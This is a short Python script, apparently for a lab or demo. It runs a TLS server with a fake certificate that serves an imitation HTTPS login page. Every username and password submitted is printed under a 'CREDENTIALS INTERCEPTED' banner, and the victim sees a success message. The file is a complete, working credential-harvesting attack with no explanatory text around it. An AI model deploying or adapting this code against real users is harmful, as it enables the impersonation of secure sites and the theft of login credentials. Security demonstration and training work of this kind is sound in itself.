#!/usr/bin/env python3
import http.server
import ssl
import json

class MITMHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = '''
            <!DOCTYPE html>
            <html>
            <head><title>HTTPS Application</title></head>
            <body>
                <h1>HTTPS Application (MITM)</h1>
                <form id="loginForm">
                    <input type="text" id="username" placeholder="Username" required><br>
                    <input type="password" id="password" placeholder="Password" required><br>
                    <button type="submit">Login</button>
                </form>
                <div id="response"></div>
                <script>
                    document.getElementById('loginForm').addEventListener('submit', async (e) => {
                        e.preventDefault();
                        const data = {
                            username: document.getElementById('username').value,
                            password: document.getElementById('password').value
                        };
                        const response = await fetch('/login', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        });
                        const result = await response.json();
                        document.getElementById('response').innerHTML = '<p>Success</p>';
                    });
                </script>
            </body>
            </html>
            '''
            self.wfile.write(html.encode())

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(body)

            print("\n" + "="*60)
            print("[MITM ATTACK] CREDENTIALS INTERCEPTED")
            print("="*60)
            print(f"Username: {data['username']}")
            print(f"Password: {data['password']}")
            print("="*60 + "\n")

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = {'success': True}
            self.wfile.write(json.dumps(response).encode())

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 8443), MITMHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('certs/fake_cert.pem', 'certs/fake_key.pem')
    server.socket = context.wrap_socket(server.socket, server_side=True)

    print('[MITM PROXY] Running on https://localhost:8443')
    print('[MITM PROXY] Using FAKE certificate')
    server.serve_forever()
